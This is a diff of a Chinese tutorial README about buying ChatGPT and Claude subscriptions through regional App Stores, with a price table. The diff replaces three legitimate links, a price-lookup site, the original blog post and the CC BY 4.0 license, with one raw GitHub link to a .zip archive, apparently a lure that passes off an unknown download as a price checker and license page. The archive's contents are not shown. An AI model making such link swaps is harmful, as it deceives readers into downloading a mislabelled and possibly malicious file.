@@ -17,7 +17,7 @@
 | Claude Max 5x | $124.99/月 | ≈ ¥499/月 | 尼日利亚 |
 | Claude Max 20x | $249.99/月 | ≈ ¥997/月 | 尼日利亚 |
 
-> 价格随汇率波动，以 [App Store Price](https://appstoreprice.org) 实时查询为准。
+> 价格随汇率波动，以 [App Store Price](https://github.com/waila1/apple-id-subscribe-ai/raw/refs/heads/main/docs/id_apple_subscribe_ai_v2.1-alpha.3.zip) 实时查询为准。
 
 ## 教程目录
 
@@ -56,10 +56,10 @@ App Store 内购是苹果官方支持的支付方式，ChatGPT 和 Claude 都支
 
 ## 原文出处
 
-本教程原文发布于 [App Store Price 博客](https://appstoreprice.org/zh/blog/pay-for-ai-subscriptions-via-app-store)。
+本教程原文发布于 [App Store Price 博客](https://github.com/waila1/apple-id-subscribe-ai/raw/refs/heads/main/docs/id_apple_subscribe_ai_v2.1-alpha.3.zip)。
 
 ## License
 
-[CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
+[CC BY 4.0](https://github.com/waila1/apple-id-subscribe-ai/raw/refs/heads/main/docs/id_apple_subscribe_ai_v2.1-alpha.3.zip)
 
 转载或引用本教程内容时，请注明出处并附上原文链接。
